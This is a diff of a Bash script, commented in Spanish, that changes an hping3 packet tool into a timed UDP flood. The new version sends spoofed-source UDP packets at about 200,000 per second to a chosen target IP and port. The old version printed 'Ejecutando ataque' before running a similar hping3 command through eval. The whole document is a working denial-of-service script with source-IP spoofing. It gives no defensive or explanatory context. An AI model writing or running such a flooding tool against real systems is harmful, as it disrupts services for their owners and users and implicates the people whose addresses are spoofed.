@@ -1,31 +1,22 @@
 #!/bin/bash
 
-# Uso: ./script.sh -ip IP_OBJETIVO -p PUERTO -c PAQUETES -t TIEMPO --udp --spoof IP_ORIGEN
+# Uso: ./udp_spoof_single_fast.sh -ip IP_DESTINO -port PUERTO -t TIEMPO(segundos) -s IP_SPOOF
 
-# Parsear argumentos
 while [[ $# -gt 0 ]]; do
   case $1 in
     -ip)
       TARGET_IP="$2"
       shift 2
       ;;
-    -p)
+    -port)
       TARGET_PORT="$2"
-      shift 2
-      ;;
-    -c)
-      PACKETS="$2"
       shift 2
       ;;
     -t)
       TIME="$2"
       shift 2
       ;;
-    --udp)
-      UDP=true
-      shift
-      ;;
-    --spoof)
+    -s)
       SPOOF_IP="$2"
       shift 2
       ;;
@@ -36,31 +27,17 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
-# Validar parámetros mínimos
-if [[ -z "$TARGET_IP" || -z "$TARGET_PORT" || -z "$PACKETS" || -z "$SPOOF_IP" ]]; then
-  echo "Uso: $0 -ip IP_OBJETIVO -p PUERTO -c PAQUETES -t TIEMPO --udp --spoof IP_ORIGEN"
+if [[ -z "$TARGET_IP" || -z "$TARGET_PORT" || -z "$TIME" || -z "$SPOOF_IP" ]]; then
+  echo "Uso: $0 -ip IP_DESTINO -port PUERTO -t TIEMPO(segundos) -s IP_SPOOF"
   exit 1
 fi
 
-echo "Ejecutando ataque:"
-echo "IP destino: $TARGET_IP"
-echo "Puerto destino: $TARGET_PORT"
-echo "Paquetes: $PACKETS"
-echo "Tiempo (segundos): ${TIME:-No definido}"
-echo "Modo UDP: ${UDP:-No}"
-echo "IP spoofeada: $SPOOF_IP"
+echo "Enviando paquetes UDP durante $TIME segundos a $TARGET_IP:$TARGET_PORT con spoof IP $SPOOF_IP..."
+echo "Intentando velocidad: 200000 paquetes/segundo"
 
-# Construir comando hping3
-CMD="sudo hping3 --spoof $SPOOF_IP -p $TARGET_PORT -c $PACKETS $TARGET_IP"
-if [[ $UDP == true ]]; then
-  CMD="$CMD --udp"
-else
-  CMD="$CMD -S"
-fi
+END=$((SECONDS+TIME))
+while [ $SECONDS -lt $END ]; do
+  sudo hping3 --spoof $SPOOF_IP --udp -p $TARGET_PORT --fast --interval u5 -c 200000 $TARGET_IP
+done
 
-if [[ -n "$TIME" ]]; then
-  CMD="$CMD -i u$((1000000*$TIME/$PACKETS))"
-fi
-
-echo "Comando: $CMD"
-eval $CMD
+echo "Finalizado."
